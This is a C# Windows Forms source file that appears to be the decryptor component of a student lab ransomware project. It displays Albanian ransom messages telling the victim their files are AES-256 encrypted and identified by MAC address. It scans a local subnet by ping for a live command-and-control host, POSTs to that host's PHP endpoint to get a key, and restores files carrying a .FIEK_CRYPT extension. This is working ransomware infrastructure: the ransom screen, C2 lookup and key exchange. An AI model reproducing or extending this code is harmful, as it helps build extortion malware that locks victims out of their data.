using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Net.NetworkInformation;
using System.Security.Cryptography;
using System.Net.Sockets;

namespace FIEK_DEC_R
{
    public partial class Form1 : Form
    {

        Rijndael AES = Rijndael.Create();
        

        public Form1()
        {
            InitializeComponent();
            this.BackColor = Color.FromArgb(37, 37, 37);
            rtb_2.BackColor = Color.FromArgb(37, 37, 37);
            rtb_2.ForeColor = Color.White;
            // "010001100100000101001011010101010100110001010100010001010101010001001001001000000100100100100000010010010100111001011000010010000100100101001110010010010100010101010010010010010101001101000101001000000100010101001100010001010100101101010100010100100100100101001011010001010010000001000100010010000100010100100000010010110100111101001101010100000100101001010101010101000100010101010010010010010100101101000101"
            rtb_2.Text = "01000110010000010100101101010101010011000101010001000101010101000100100100100000010010010010000001001001010011100101100001001000010010010100111001001001010001010101001001001001010100110100010100100000010001010100110001000101010010110101010001010010010010010100101101000101001000000100010001001000010001010010000001001011010011110100110101010000010010100101010101010100010001010101001001001001010010110100010100000000";
            rtb_2.ReadOnly = true;
            wb_1.DocumentText = "<body style='background-color:rgb(37,37,37);'>";
        }

        private void btn_get_key_Click(object sender, EventArgs e)
        {
            string response = web_1(rtb_1.Text);
            wb_1.DocumentText = response;
        }



        public string web_1(string k1)
        {
            string c2 = getActiveC2();
            //string c2 = "192.168.10.101";
            string requestmethod = "POST";
            string postData = "var1=" + k1;

            //The Byte Array that will be used for writing the data to the stream.
            byte[] byteArray = Encoding.ASCII.GetBytes(postData);
            string URL = "http://"+c2+"/Ushtrime/a4.php";
            string contenttype = "application/x-www-form-urlencoded";
            string responseFromServer = null;
            WebRequest request = WebRequest.Create(URL);
            Stream dataStream;
            WebResponse response;
            StreamReader reader;
            request.Method = requestmethod;
            request.ContentType = contenttype;
            request.ContentLength = byteArray.Length;
            dataStream = request.GetRequestStream();
            dataStream.Write(byteArray, 0, byteArray.Length);
            dataStream.Close();
            response = request.GetResponse();
            dataStream = response.GetResponseStream();
            reader = new StreamReader(dataStream);
            responseFromServer = reader.ReadToEnd();
            reader.Close();
            dataStream.Close();
            response.Close();
            return responseFromServer;
        }

        private void btn_decrypt_Click(object sender, EventArgs e)
        {
            AES.Key = Convert.FromBase64String(txt_key.Text);
            AES.IV = Convert.FromBase64String(txt_iv.Text);
            string dir_name = "C:\\Users\\Tester\\Desktop\\ENC_TST";
            Decrypt_Directory(dir_name);
        }

        private void Decrypt_Directory(string s_path)
        {
            string[] ext = new[] { ".txt", ".doc", ".docx", ".pdf", ".jpg", ".jpeg", ".gif" };
            //get list of files in the targeted directory
            string[] files = Directory.GetFiles(s_path);
            int count = 0;
            foreach (string f_h in files)
            {
                string extension = Path.GetExtension(f_h);
                MessageBox.Show(f_h + "   EXT: " + extension);
                if (extension == ".FIEK_CRYPT")
                {
                    
                    File_Decrypt(f_h);
                }
               
            }
        }

        private void File_Decrypt(string st)
        {
           
            FileStream fs_1 = new FileStream(st, FileMode.Open);
            CryptoStream cs_1 = new CryptoStream(fs_1, AES.CreateDecryptor(), CryptoStreamMode.Read);
            StreamReader sr_1 = new StreamReader(cs_1);
            string txt_r = sr_1.ReadToEnd();
            MessageBox.Show("READ: " + txt_r);
            fs_1.Close();
            cs_1.Close();
            sr_1.Close();
            FileStream fs_w = new FileStream(st, FileMode.Create);
            StreamWriter sw_1 = new StreamWriter(fs_w);
            sw_1.Write(txt_r);
            sw_1.Flush();
            sw_1.Close();
            fs_w.Close();
            string n_path = st.Replace(".FIEK_CRYPT", "");
            File.Move(st, n_path);
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            string msg_1 = "> Te dhenat tuaja jane enkriptuar me algoritmin AES-256 " +
                           "\n  dhe nuk jane te perdorshme";

            string msg_2 = "> Ato mund te kthehen vetem permes dekriptimit me çelesin " +
                "\n  sekret, ID-ja juaj per identifikim eshte MAC Adresa";
            label3.Text = msg_1;
            label4.Text = msg_2;
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {
            
        }

        private string getActiveC2()
        {
            string active_c2 = "";
            string[] c2_arr = { "192.168.10.100", "192.168.10.101", "192.168.10.102", "192.168.10.103", "192.168.10.104" };
            try
            {
                string localIP;
                using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0))
                {
                    socket.Connect("8.8.8.8", 65530);
                    IPEndPoint endPoint = socket.LocalEndPoint as IPEndPoint;
                    localIP = endPoint.Address.ToString();
                }

                Ping pingSender = new Ping();
                for (int i = 90; i < 120; i++)
                {
                    string ip = "192.168.10." + i.ToString();
                    if (ip == localIP)
                    {
                        continue;
                    }
                    else
                    {
                     
                        PingReply reply = pingSender.Send(ip);
                        if (reply.Status == IPStatus.Success)
                        {
                            active_c2 = ip;
                            break;
                        }
                        else
                        {

                        }
                     
                    }
                }
                

            }
            catch (PingException EX)
            {
                MessageBox.Show(EX.ToString());
            }

            return active_c2;
        }
    }
}
